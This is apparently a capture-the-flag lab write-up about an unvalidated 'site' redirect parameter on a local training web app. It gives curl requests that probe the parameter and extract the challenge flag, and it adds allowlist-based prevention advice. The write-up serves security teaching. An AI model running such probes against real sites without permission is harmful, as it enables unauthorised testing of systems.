# Redirect

## 1. Discovery

The homepage contains links that use the `redirect` page:

```html
<a href="index.php?page=redirect&site=facebook">
<a href="index.php?page=redirect&site=twitter">
<a href="index.php?page=redirect&site=instagram">
```

The `site` parameter is supplied by the user. This makes it a useful input to inspect and test.

## 2. Exploitation

Request a known destination:

```bash
curl -s -D - -o /dev/null \
"http://127.0.0.1:8080/index.php?page=redirect&site=facebook"
```

Observed result:

```text
HTTP/1.1 302 Moved Temporarily
Location: http://facebook.com/42Born2Code/
```

Send an unexpected value:

```bash
curl -s \
"http://127.0.0.1:8080/index.php?page=redirect&site=example.com" \
| grep "Good Job"
```

Observed result: HTTP 200. The HTML displays the challenge flag.

## 3. Technical Explanation

The `site` parameter is controlled by the user. The value `site=facebook` causes a redirect. The values `site=example.com` and `site=FACEBOOK` return HTTP 200 instead. An unexpected value displays the challenge flag. These results do not prove that an arbitrary external URL can be used as a redirect destination.

## 4. Security Impact

Incorrect input validation can cause unsafe redirect behavior. Depending on how the application uses the input, users may be sent to an unintended destination. The observed behavior here does not demonstrate an arbitrary external redirect.

## 5. Prevention

Validate `site` against a strict allowlist of approved names. Reject every value outside that list. Map each approved name to a fixed destination on the server. Do not build a redirect destination from untrusted input.

## 6. Flag Verification

Run the command from the repository root. It matches the response's `Good Job` flag text, extracts that value, and compares it with `mandatory/redirect/flag`:

```bash
curl -s \
"http://127.0.0.1:8080/index.php?page=redirect&site=example.com" \
| grep -oE 'Good Job[^<]*[a-f0-9]{64}' \
| grep -oE '[a-f0-9]{64}' \
| diff - mandatory/redirect/flag
```

An exit status of `0` means that the retrieved flag matches the saved flag. The address `127.0.0.1:8080` is our local VirtualBox port-forwarding address. Adjust it if the evaluation environment uses a different address or port.
